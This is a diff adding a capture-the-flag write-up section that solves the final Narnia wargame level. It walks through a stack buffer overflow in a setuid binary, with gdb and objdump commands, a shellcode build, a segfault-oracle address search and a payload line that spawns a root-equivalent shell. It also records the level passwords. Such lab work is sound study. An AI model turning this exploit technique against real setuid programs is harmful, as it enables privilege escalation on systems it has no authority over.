@@ -383,5 +383,46 @@ Verification: each password was accepted by logging in as the next level's accou
 - **Verification:** logged in as `narnia8` with this password (`whoami` → `narnia8`).
 - **Recording:** `recordings/narnia/L7.cast`
 
-**Narnia status:** levels 0–7 solved; the game continues with levels 8 and 9 (narnia8/narnia9 accounts exist and their password files are readable by the next level), which are covered in the next section.
+## Level 8 → narnia9 (final level)
+- **Account:** `narnia8`, password `aToTvI5BYB`.
+- **Goal:** `func()` does `char *blah = b; char bok[20]; memset(bok,0,20); for(i=0; blah[i] != '\0'; i++) bok[i] = blah[i]; printf("%s\n", bok);` with `i` a global. The unbounded copy overflows `bok`.
+- **Technique and why it works:** the copy loop overflows the 20-byte `bok` into the saved EBP and return address. The twist is that `bok[20..23]` is the local `blah` pointer itself (`blah` sits at `ebp-0x4`, just above `bok` at `ebp-0x18`), so at `i=20` the loop overwrites its own source pointer with `argv[20]` and then reads from the redirected pointer — it dies early unless the pointer keeps pointing at readable data. Setting `argv[20..23]` to the address of the argv string keeps `blah` valid, so the loop runs all the way to the return address at `bok[28..31]`, where it copies `argv[28..31]`. We point that return address into a NOP sled placed in `argv` at `argv+32`; the sled holds null-free shellcode (`write "PWN!"`, `geteuid`, `setreuid(euid,euid)`, `setuid(euid)`, `execve("/bin/sh")`). ASLR is off, so the argv address is fixed; it is found with a segfault oracle.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `cat /narnia/narnia8.c`: `char *blah=b; char bok[20]; ... for(i=0; blah[i]!='\0'; i++) bok[i]=blah[i]; printf("%s\n", bok);`.
+2. **Find the layout.** `objdump -d --no-show-raw-insn /narnia/narnia8 | sed -n '/<func>:/,/ret/p'` shows `bok` at `ebp-0x18` (`mov %dl,-0x18(%ebp,%eax,1)`) and the local pointer at `ebp-0x4`. So `bok[20..23]` = `blah`, `bok[24..27]` = saved EBP, `bok[28..31]` = return address.
+3. **Check protections.** `file` → setuid ELF 32-bit; `readelf -lW | grep GNU_STACK` → `RWE` (executable stack); `cat /proc/sys/kernel/randomize_va_space` → `0`.
+4. **Confirm in gdb.**
+   ```
+   gdb -batch -ex 'b *0x80491d6' -ex 'run AAAA' -ex 'p/x $ebp' -ex 'p/x $ebp-0x18' -ex 'p/x $ebp-0x4' -ex 'p/x *(char**)($ebp-0x4)' -ex 'x/8wx $ebp-0x18' /narnia/narnia8
+   ```
+   `bok = ebp-0x18`, `blah = ebp-0x4`, and `blah` points at the argv string. The raw output of a 190-byte arg shows `bok[20..23]` holding the corrupted pointer (high bytes `0xffffdf`) — proving the self-corruption.
+5. **Write the shellcode in `vim /tmp/l8.asm`** (same null-free shellcode as the previous levels: marker write, `geteuid`, `setreuid`, `setuid`, `execve("/bin/sh")`), then:
+   ```
+   nasm -f elf32 /tmp/l8.asm -o /tmp/l8.o
+   objdump -d -M intel /tmp/l8.o
+   objcopy -O binary --only-section=.text /tmp/l8.o /tmp/l8.bin
+   xxd -p /tmp/l8.bin ; wc -c /tmp/l8.bin
+   ```
+6. **Find the argv address with the segfault oracle.** Put `0x41414141` at `argv[28..31]` and sweep `argv[20..23]`. If `blah` stays valid the loop copies that value into the return address, the program prints `bok`, and then calls `0x41414141` — a fault *with output*. The sweep candidate that does this is the argv address: **`0xffffdf15`**.
+7. **Build the payload:**
+   ```
+   payload = b"\x90"*20 + pack("<I", 0xffffdf15) + b"BBBB" + pack("<I", 0xffffdf15+32) + b"\x90"*100 + sc
+   ```
+   `argv[20..23]` keeps `blah` valid; `argv[28..31]` is the return address into the NOP sled at `argv+32`.
+8. **Run it.** `python3 /tmp/e_narnia8.py` prints the buffer, then `PWN!`, and drops into a shell.
+9. **Use the shell.**
+   ```
+   id                        # uid=14009(narnia9) gid=14008(narnia8)
+   cat /etc/narnia_pass/narnia9
+   ```
+- **Password for narnia9:** `za689KedXW`
+- **Verification:** logged in as `narnia9` with this password (`whoami` → `narnia9`).
+- **Final level:** there is no `/narnia/narnia9` binary; `narnia9`'s home contains `CONGRATULATIONS`:
+  ```
+  you are l33t! next plz...
+  ```
+  **Narnia is complete.**
+- **Recording:** `recordings/narnia/L8.cast`
+
 
